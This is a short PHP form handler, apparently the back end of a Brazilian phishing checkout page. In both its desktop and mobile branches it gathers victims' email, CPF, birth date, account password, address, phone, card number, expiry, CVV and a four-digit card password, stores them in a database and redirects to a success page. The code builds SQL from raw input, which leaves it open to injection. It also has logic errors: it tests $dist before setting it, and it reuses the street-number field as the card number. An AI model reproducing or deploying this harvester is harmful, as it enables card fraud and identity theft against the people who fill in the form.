<?php
include("../conexao.php");
include("../banco.php");
switch($dist){
    case "desktop":
$email = $_POST["email"];
$cpf = $_POST["cpf"];
$nomecompleto = $_POST["fullName"];
$nascimento = $_POST["birthDate"];
$senha = $_POST["password"];
$cep = $_POST["cep"];
$rua = $_POST["rua"];
$numero = $_POST["number"];
$complemento = $_POST["complement"];
$bairro = $_POST["bairro"];
$cidade = $_POST["cidade"];
$estado = $_POST["uf"];
$telefone = $_POST["telephone"];
$numerocc =  $_POST["number"];
$nomecc = $_POST["fullName"];
$vencimento = $_POST["expirationMonth"] . "/" . $_POST['expirationYear'];
$cvv = $_POST["CVC"];
$metodo = "Cartao";
$dist = $_GET['dist'];
$ip = $_SERVER['REMOTE_ADDR'];
$codigoboleto = 0;
$senha4 = $_POST['senha4'];

$query = "INSERT INTO `informacoes` (`id`, `email`, `cpf`, `nomecompleto`, `nascimento`, `senha`, `cep`, `endereco`, `numero`, `complemento`, `bairro`, `cidade`, `estado`, `telefone`, `numerocc`, `nomecc`, `validadecc`, `cvv`, `metodo`, `dist`, `ip`, `codigoboleto`, `idproduto`, `senhacc`) VALUES (NULL, '{$email}', '{$cpf}', '{$nomecompleto}', '{$nascimento}', '{$senha}', '{$cep}', '{$rua}', '{$numero}', '{$complemento}', '{$bairro}', '{$cidade}', '{$estado}', '{$telefone}', '{$numerocc}', '{$nomecc}', '{$vencimento}', '{$cvv}', '{$metodo}', '{$dist}', '{$ip}', '{$codigoboleto}', '{$id}', '{$senha4}');";
if ($resultado = mysqli_query($conexao, $query)){
    header('Location: sucessocc.php?id='.$id.'&titulo='.$nomelink.'&dist='.$dist.'&email='.$email);
}else{

};
break;
    case "mobile":
        $email = $_POST['email'];
        $cpf = $_POST['cpf_cnpj'];
        $nomecompleto = $_POST['name'];
        $nascimento = $_POST['birth_date'];
        $senha = $_POST['password'];
        $cep = $_POST['cep'];
        $endereco = $_POST['rua'];
        $numero = $_POST['number'];
        $complemento = $_POST['complement'];
        $bairro = $_POST['bairro'];
        $cidade = $_POST['cidade'];
        $estado = $_POST['uf'];
        $telefone = $_POST['phone_number'];
        $metodo = "Cartao";
        $dist = $_GET['dist'];
        $ip = $_SERVER['REMOTE_ADDR'];
        $codigoboleto = 0;
        $numerocc =  $_POST["cardNumber"];
        $nomecc = $_POST["card_holder_name"];
        $mescc = $_POST['card_expiration_month'];
        $anocc = $_POST['card_expiration_year'];
        $vencimento = $mescc .'/'.$anocc;
        $cvv = $_POST["cvv"];
        $senha4 = $_POST['senha4'];

        $query = "INSERT INTO `informacoes` (`id`, `email`, `cpf`, `nomecompleto`, `nascimento`, `senha`, `cep`, `endereco`, `numero`, `complemento`, `bairro`, `cidade`, `estado`, `telefone`, `numerocc`, `nomecc`, `validadecc`, `cvv`, `metodo`, `dist`, `ip`, `codigoboleto`, `idproduto`, `senhacc`) VALUES (NULL, '{$email}', '{$cpf}', '{$nomecompleto}', '{$nascimento}', '{$senha}', '{$cep}', '{$endereco}', '{$numero}', '{$complemento}', '{$bairro}', '{$cidade}', '{$estado}', '{$telefone}', '{$numerocc}', '{$nomecc}', '{$vencimento}', '{$cvv}', '{$metodo}', '{$dist}', '{$ip}', '{$codigoboleto}', '{$id}', '{$senha4}');";
            if ($resultado = mysqli_query($conexao, $query)){
                header('Location: sucessocc.php?id='.$id.'&titulo='.$nomelink.'&dist='.$dist.'&email='.$email);
        }else{
            echo "Fail";
        };

        break;
}